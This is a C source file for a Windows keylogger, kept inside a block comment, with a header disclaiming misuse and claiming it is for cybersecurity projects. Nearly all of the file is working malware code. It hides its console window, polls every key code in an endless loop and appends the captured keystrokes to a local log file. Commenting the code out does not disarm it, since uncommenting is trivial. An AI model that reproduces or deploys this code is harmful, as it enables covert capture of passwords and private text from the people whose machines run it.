/*

This is a keylogger program, in C. Don't misuse it. It is only for cybersecurity projects.
Don't misuse it. I accept no responsibility or repercusssions due to malicious use of this code.
As it is all commented out. Anyone who uses it will have to deliberately uncomment it.

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void stealth();
int save(int keystroke, const char *file);

int main()
{
    stealth();
    
    while(1)
    {
        for(int i = 0; i < 256; i++)
        {
            if(GetAsyncKeyState(i) == -32767) 
            {
                save(i, "LOG.txt");
            }
        }
    }

    return 0; // Correctly placed return statement
}

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int key_stroke, const char *file)
{
    // Skip mouse button presses
    if (key_stroke == VK_LBUTTON || key_stroke == VK_RBUTTON) return 0;

    FILE *outputFile = fopen(file, "a+");
    if (outputFile == NULL) return -1; // Check if file opened successfully

    switch(key_stroke)
    {
        case VK_BACK: fprintf(outputFile, "[BACKSPACE]"); break;
        case VK_RETURN: fprintf(outputFile, "\n"); break;
        case VK_SPACE: fprintf(outputFile, " "); break;
        case VK_TAB: fprintf(outputFile, "[TAB]"); break;
        case VK_SHIFT: fprintf(outputFile, "[SHIFT]"); break;
        case VK_CONTROL: fprintf(outputFile, "[CONTROL]"); break;
        case VK_ESCAPE: fprintf(outputFile, "[ESCAPE]"); break;
        case VK_END: fprintf(outputFile, "[END]"); break;
        case VK_HOME: fprintf(outputFile, "[HOME]"); break;
        case VK_LEFT: fprintf(outputFile, "[LEFT]"); break;
        case VK_RIGHT: fprintf(outputFile, "[RIGHT]"); break;
        case VK_UP: fprintf(outputFile, "[UP]"); break;
        case VK_DOWN: fprintf(outputFile, "[DOWN]"); break;
        case 190: // Decimal point
        case 110: // Numpad decimal
            fprintf(outputFile, "."); break;
        default:
            // Corrected comparison operator
            if (key_stroke >= 32 && key_stroke <= 126) 
            {
                fprintf(outputFile, "%c", key_stroke);
            }
            break;
    }
    
    fclose(outputFile);
    return 0;
}
*/